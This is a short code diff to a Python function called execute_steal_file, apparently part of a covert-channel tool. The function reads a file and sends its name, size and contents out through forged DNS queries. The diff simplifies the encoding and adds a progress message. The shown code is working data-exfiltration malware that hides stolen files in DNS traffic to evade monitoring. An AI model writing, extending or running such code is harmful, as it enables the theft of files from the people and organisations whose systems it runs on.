@@ -342,13 +342,13 @@ def execute_steal_file(filepath) -> bool:
     with open(filepath, "r") as f:
         file_data = f.read()
         file_size_bytes = len(file_data)
-        file_data = file_data.encode("utf-8")
     filename = os.path.basename(filepath)
     metadata = f"FILENAME:{filename} NUM_BYTES:{str(file_size_bytes)}"
+    print("Sending file...")
     # Send meta data first.
     forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
     # Send the file.
-    forge_dns_query_block(file_data.decode("utf-8"), FILE_TRANSFER_IDENTIFICATION)
+    forge_dns_query_block(file_data, FILE_TRANSFER_IDENTIFICATION)
 
 
 def packet_handler(pkt):
